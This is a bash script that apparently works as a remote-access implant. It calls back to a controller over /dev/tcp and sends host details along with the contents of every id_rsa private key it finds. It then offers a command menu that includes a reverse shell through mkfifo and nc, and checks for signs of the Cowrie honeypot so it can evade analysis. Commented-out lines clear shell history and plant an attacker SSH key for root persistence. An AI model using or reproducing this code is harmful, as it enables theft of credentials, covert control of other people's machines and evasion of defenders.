#!/bin/bash

#unset HISTFILE

#perms=$(id | grep uid | cut -d ' ' -f1 | cut -d '=' -f2 | cut -d '(' -f1)

#if [ $perms -eq 0 ]; then
#  mkdir -p /root/.ssh
#  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys
#else
#  continue
#fi 

while [ true ]; do

   arr[0]="127.0.0.1"
   svr=${arr[0]}

   eval 'exec 3<>/dev/tcp/$svr/9001;'
   if [[ ! "$?" -eq 0 ]] ; then
        continue
   fi

  eval 'printf "$(date)\r\n" >&3;'

  if [[ ! "$?" -eq 0 ]] ; then
        continue
   fi
   eval 'printf "Agent Name: $(md5sum /etc/passwd | cut -d '/' -f1)\r\n" >&3;'
   if [[ ! "$?" -eq 0 ]] ; then
    continue
   fi
  eval 'printf "public ip information: $(curl ipinfo.io 2>/dev/null; sleep 1)\r\n\n" >&3;'
  eval 'printf "ip information: $(ip a | ifconfig)\r\n\n" >&3;'
  eval 'printf "perms: $(id)\r\n\n" >&3;'  
  eval 'printf "os, kernel: $(uname -a)\r\n\n" >&3;'
  eval 'printf "ssh keys: $(find / -type f -name "id_rsa" 2>/dev/null -exec cat {} \;)\r\n\n" >&3;'
  eval 'printf "standing by for your orders:\r\nEnter help to see menu: \r\n" >&3;'

   while [ true ]; do
    eval "read msg_in <&3;"

    if [[ ! "$?" -eq 0 ]] ; then
        break
    fi

    if  [[ "$msg_in" =~ "ping" ]] ; then
        eval 'printf "succ %s\r\n" "${msg_in:5}" >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
         break
        fi
        sleep 1
        eval 'printf "joined\r\n" >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
         break
        fi
    elif [[ "$msg_in" =~ "help" ]] ; then
      eval 'printf "Help Menu:\r\nping --> check connection\r\ncgroup --> see cgroups\r\nld --> dir listing\r\nhoneypot --> check for cowrie honeypot\r\nhelp --> display commands\r\nps --> process list tree\r\nnetstat --> view connections\r\nusers --> see logged on users\r\nshell --> spawn remote shell\r\ntraceroute --> see path to remote machine\r\nexit --> quit session\r\n" >&3;'
    elif [[ "$msg_in" =~ "traceroute" ]] ; then
      eval 'printf "traceroute 8.8.8.8: $(traceroute 8.8.8.8 > /tmp/trace)\r\n" >&3;'
      sleep 3
      eval 'printf "getting data: $(cat /tmp/trace)\r\n" >&3;'
      rm /tmp/trace
    elif [[ "$msg_in" =~ "shell" ]]; then
      eval 'printf "Start a listener on 9002:\r\n" >&3;'
      sleep 10
      eval '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 9002 >/tmp/f)'
    elif [[ "$msg_in" =~ "ld" ]]; then
      eval 'printf "Dir: $(pwd)\r\n" >&3;'
      eval 'printf "Listing: $(ls -la)\r\n" >&3;'
    elif [[ "$msg_in" =~ "users" ]]; then
      eval 'printf "Logged on users: $(w)\r\n" >&3;'      
    elif [[ "$msg_in" =~ "honeypot" ]]; then
      eval 'printf "Starting honeypot checks:\r\n" >&3;'
#start cowrie honeypot checks
#srv04 is the default hostname for cowrie
      view=$(which cat)

      if [ "$($view /etc/hostname | grep srv04)" ]; then
       #rm implant.sh
        eval 'printf "Honeypot detected!!!\r\n" >&3;'
       exit 4
      else
       eval 'printf "Hostname is NOT srv04\r\n" >&3;'
      fi
#phil is the default home directory on cowrie and cowrie will run on Debian 4.* by default
#want to combine these to in order to make sure we are not deleting off every machine with phil as a user
      look=$(which ls)
      if [ "$($look /home | grep 'phil' && $view /proc/version | grep "Debian 4.")" ]; then 
        eval 'printf "Honeypot detected!!!\r\n" >&3;'
        #rm implant.sh
       exit 5
      else
       eval 'printf "No phil user detected\r\n" >&3;'
      fi
#file is not included on cowrie so check for that
      if [ "$(which file)" ]; then
       eval 'printf "file command on the box\r\n" >&3;'
      else      
        eval 'printf "Honeypot detected!!!\r\n" >&3;'
       #rm implant.sh
       exit 6
      fi
#test for "fake internet access"
#need to fix the ping part coming back through on the implant side
      fake=$(ping -c 4 999.999.999.999 | grep "64 bytes" | cut -d " " -f1,2)
      if [ "$fake" ];then 
        eval 'printf "Honeypot detected!!!\r\n" >&3;'
        #rm implant.sh
       exit 7
      else
       eval 'printf "Fake internet not detected\r\n" >&3;'
        eval 'printf "Honey pot checks over, no cowrie hp detected\n\r" >&3;'
      fi
    elif [[ "$msg_in" =~ "ps" ]]; then
      eval 'printf "Process list: $(ps -ef 2>/dev/null)\r\n" >&3;'
    elif [[ "$msg_in" =~ "netstat" ]]; then
      eval 'printf "Connections: $(netstat -antpu 2>/dev/null || ss -tulwn 2>/dev/null)\r\n" >&3;'      
    elif [[ "$msg_in" =~ "cgroup" ]]; then
      eval 'printf "cgroup: $(systemd-cgls --no-pager 2>/dev/null)\r\n" >&3;'


#take the ssh key and put it into a rat command 
#use the if statement to check if root user, if not then give back error message 
#if yes then enter in the public key to .ssh under /root
#module for the survey so its not auto at the begining
#potentially add colors from linpeas
#potentially a module to hide it with -exec a copy itself to devshm spawn second on a new listener and kill the first???


    else
      eval 'printf "That is not a valid command:\r\n" >&3;'      
    fi
   done
done
